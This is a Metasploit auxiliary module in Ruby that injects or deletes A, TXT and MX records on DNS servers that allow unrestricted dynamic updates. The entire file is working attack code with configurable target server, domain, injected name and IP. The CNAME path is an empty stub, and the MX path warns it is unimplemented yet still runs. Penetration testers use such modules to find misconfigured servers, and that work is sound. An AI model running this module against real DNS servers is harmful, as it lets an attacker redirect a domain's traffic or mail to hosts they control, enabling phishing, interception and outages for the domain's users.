# -*- coding: binary -*-
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'
require 'dnsruby'

class MetasploitModule < Msf::Auxiliary

  def initialize
    super(
        'Name'           => 'DNS Server Dynamic Update Record Injection',
        'Description'    => %q{
        This module allows adding and/or deleting a record to
        any remote DNS server that allows unrestricted dynamic updates.},
        'Author'         => [ 'King Sabri <king.sabri[at]gmail.com>' ],
        'References'     =>
            [
                ['URL', 'http://www.tenable.com/plugins/index.php?view=single&id=35372'],
                ['URL', 'https://github.com/KINGSABRI/CVE-in-Ruby/tree/master/NONE-CVE/DNSInject'],
                ['URL', 'https://www.christophertruncer.com/dns-modification-dnsinject-nessus-plugin-35372/'],
                ['URL', 'https://github.com/ChrisTruncer/PenTestScripts/blob/master/DNSInject.py']
            ],
        'License'        => MSF_LICENSE,
        'Actions'        =>
            [
                ['ADD',  {'Description' => 'Add a new record. [Default]'}],
                ['DEL',  {'Description' => 'Delete an existing record.'}]
            ],
        'DefaultAction' => 'ADD'
    )
    register_options(
        [
            OptString.new('DOMAIN', [true, 'The domain name']),
            OptAddress.new('NS', [true, 'The vulnerable DNS server IP address']),
            OptString.new('INJECTDOMAIN', [true, 'The name record you want to inject']),
            OptAddress.new('INJECTIP', [true, 'The IP you want to assign to the injected record']),
            OptEnum.new('TYPE',  [true, 'The record type you want to inject.', 'A', ['A', 'CNAME', 'TXT', 'MX']])
        ], self.class)
    register_advanced_options([
                                  OptString.new('TXTSTRING', [true, 'The string to be injected with TXT record', 'w00t'])
                              ])
    deregister_options( 'RHOST', 'RPORT' )

  end

  def a_record(action)
    # Send the update to the zone's primary master.
    resolver = Dnsruby::Resolver.new({:nameserver => datastore['NS']})
    # Create the update packet.
    update   = Dnsruby::Update.new(datastore['DOMAIN'])
    case
      when action == 'ADD'
        # Prerequisite is that no A records exist for the name.
        update.absent("#{datastore['INJECTDOMAIN']}.", 'A')
        # Add two A records for the name.
        update.add("#{datastore['INJECTDOMAIN']}.", 'A', 86400, datastore['INJECTIP'])
        begin
          resolver.send_message(update)
          print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['INJECTIP']}' has been added!")
        rescue Dnsruby::YXRRSet => e
          print_error("Can't inject #{datastore['INJECTDOMAIN']}. Make sure the DNS server is vulnerable or domain already exists.")
          vprint_error("Update failed: #{e}")
        end
      when action == 'DEL'
        begin
          update.present(datastore['INJECTDOMAIN'], 'A')
          update.delete(datastore['INJECTDOMAIN'],  'A')
          resolver.send_message(update)
          print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['INJECTIP']}' has been deleted!")
        rescue Dnsruby::NXRRSet => e
          print_error("Can't delete #{datastore['INJECTDOMAIN']}. DNS server is vulnerable or domain doesn't exist.")
          vprint_error "Update failed: #{e}"
        end
    end
  end
  #
  def cname_record(action)
    case
      when action == 'ADD'
      when action == 'DEL'
    end
  end

  def txt_record(action)
    resolver = Dnsruby::Resolver.new({:nameserver => datastore['NS']})
    update   = Dnsruby::Update.new(datastore['DOMAIN'])
    case
      when action == 'ADD'
        update.absent(datastore['INJECTDOMAIN'])
        update.add(datastore['INJECTDOMAIN'], Dnsruby::Types.TXT, 86400, datastore['TXTSTRING'])

        begin
          resolver.send_message(update)
          print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['TXTSTRING']}' has been added!")
        rescue Dnsruby::YXDomain => e
          print_error("Can't inject #{datastore['INJECTDOMAIN']}. Make sure the DNS server is vulnerable or domain already exists.")
          vprint_error("Update failed: #{e}")
        end
      when action == 'DEL'
        begin
          update.present(datastore['INJECTDOMAIN'], 'TXT')
          update.delete(datastore['INJECTDOMAIN'],  'TXT')
          resolver.send_message(update)
          print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['TXTSTRING']}' has been deleted!")
        rescue Dnsruby::NXRRSet => e
          print_error("Can't delete #{datastore['INJECTDOMAIN']}. DNS server is vulnerable or domain doesn't exist.")
          vprint_error "Update failed: #{e}"
        end
    end
  end

  def mx_record(action)
    resolver = Dnsruby::Resolver.new({:nameserver => datastore['NS']})
    update   = Dnsruby::Update.new(datastore['DOMAIN'])
    case
      when action == 'ADD'
        # Add A record for MX record
        a_record(action) rescue $!.class == Dnsruby::YXRRSet  # Avoid 'a_record' exception and keep going
        update.present(datastore['INJECTDOMAIN'])
        update.add(datastore['INJECTDOMAIN'], Dnsruby::Types.MX, 10, datastore['INJECTDOMAIN'])
        begin
          resolver.send_message(update)
          print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['INJECTIP']}' has been added!")
        rescue ::Exception => e
          print_error("Can't inject #{datastore['INJECTDOMAIN']}. Make sure the DNS server is vulnerable or domain already exists.")
          vprint_error("Update failed: #{e}")
        end
      when action == 'DEL'
        begin
          update.present(datastore['INJECTDOMAIN'], 'MX')
          update.delete(datastore['INJECTDOMAIN'],  'MX')
          resolver.send_message(update)
          print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['INJECTIP']}' has been deleted!")
        rescue Exception => e
          print_error("Can't delete #{datastore['INJECTDOMAIN']}. DNS server is vulnerable or domain doesn't exist.")
          vprint_error "Update failed: #{e}"
        end
    end
  end
  # Run
  def run
    print_status("Sending DNS query payload...")
    case
    when datastore['TYPE'] == 'A'
      a_record(action.name)
    when datastore['TYPE'] == 'CNAME'
      cname_record(action.name)
      print_warning("Not implemented yet.")
    when datastore['TYPE'] == 'TXT'
      txt_record(action.name)
    when datastore['TYPE'] == 'MX'
      print_warning("Not implemented yet.")
      mx_record(action.name)
    else
      print_error "Invalid Record Type!"
    end
  end

end
